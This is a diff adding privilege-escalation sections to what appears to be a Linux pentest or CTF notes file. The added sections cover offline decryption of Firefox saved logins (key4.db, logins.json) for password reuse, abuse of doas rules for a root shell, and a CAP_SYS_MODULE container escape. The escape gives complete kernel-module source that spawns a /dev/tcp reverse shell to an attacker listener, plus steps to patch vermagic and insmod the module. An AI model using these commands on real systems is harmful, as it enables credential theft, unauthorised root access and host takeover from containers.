@@ -1493,3 +1493,66 @@ Good targets are setuid/file-cap binaries and root daemons that briefly hold som
 ```bash
 cat /proc/sys/kernel/yama/ptrace_scope
 ```
+
+## Firefox saved credentials -> password-reuse privesc
+
+A readable Firefox profile (same user, or a world-readable/misplaced `.firefox`/`.mozilla` dir) lets
+you recover stored logins offline; these are frequently REUSED for a higher-priv local account, SSH,
+or doas. You need BOTH files from the profile dir (`~/.mozilla/firefox/<rand>.default*` or a custom
+path):
+
+```bash
+#   key4.db      (master key)
+#   logins.json  (encrypted logins)
+python3 firefox_decrypt.py <profile_dir>   # github.com/unode/firefox_decrypt -> plaintext user:pass
+```
+
+Then reuse the recovered password: `su <user>`, SSH, or `doas`. Enumerate for readable profiles:
+`find / -name key4.db 2>/dev/null` and `find / -name logins.json 2>/dev/null`.
+
+## doas privilege escalation
+
+`doas` (OpenBSD's sudo alternative, often built from source on Linux) reads its config from
+`/etc/doas.conf` OR `/usr/local/etc/doas.conf` - source builds default to the latter, so **check both**.
+A rule `permit <user> as root` lets that user run any command as root (prompting for the invoking
+user's password unless `nopass` is set). If you can BECOME that user (a recovered credential, a SUID,
+group abuse), doas is a direct root path:
+
+```bash
+ls -l "$(which doas)"                              # SUID root binary present?
+cat /usr/local/etc/doas.conf /etc/doas.conf 2>/dev/null   # who is permitted, as whom, nopass?
+doas /bin/bash                                     # -> root (enter that user's password)
+```
+
+<!-- promoted-slug: firefox-creds-doas-privesc -->
+
+## CAP_SYS_MODULE escape when kernel headers do not match the running kernel
+
+A container or host with `cap_sys_module` (`capsh --print | grep sys_module`) lets you `insmod` a module
+into the HOST kernel: `call_usermodehelper()` inside `init_module` runs a command in the host init
+namespace as root (container breakout / privesc). The common blocker is that the installed kernel headers
+do not match the RUNNING kernel (e.g. `/usr/src/linux-headers-6.8.0-1030` present but `uname -r` =
+`6.8.0-1031`), so `insmod` rejects the module on a vermagic mismatch.
+
+Fix: build against the closest available headers, then binary-patch the `vermagic` string in the `.ko` to
+the running `uname -r` (same byte length, so a straight `sed` is safe), then load:
+```bash
+cat > revshell.c <<'EOF'
+#include <linux/kmod.h>
+#include <linux/module.h>
+MODULE_LICENSE("GPL");
+static int __init x(void){ char *a[]={"/bin/bash","-c","bash -i >& /dev/tcp/LHOST/PORT 0>&1",NULL};
+ static char *e[]={"PATH=/sbin:/bin:/usr/sbin:/usr/bin",NULL}; return call_usermodehelper(a[0],a,e,UMH_WAIT_EXEC);}
+static void __exit y(void){} module_init(x); module_exit(y);
+EOF
+printf 'obj-m += revshell.o\nKDIR := /usr/src/linux-headers-<AVAILABLE>\nall:\n\tmake -C $(KDIR) M=$(PWD) modules\n' > Makefile
+make
+sed -i 's/<AVAILABLE>/<RUNNING>/g' revshell.ko    # patch vermagic to the RUNNING uname -r (equal length)
+insmod revshell.ko
+```
+The reverse shell fires in the HOST context = host root. Point it at a listener the target can reach
+(e.g. the docker gateway / a container you already own on the same bridge). If only a scripting binary
+carries the cap (not full root), fake `/lib/modules/$(uname -r)/` in a writable dir and load via python
+`kmod` instead. See [[linux-container-escape]].
+
+<!-- promoted-slug: cap-sys-module-vermagic -->
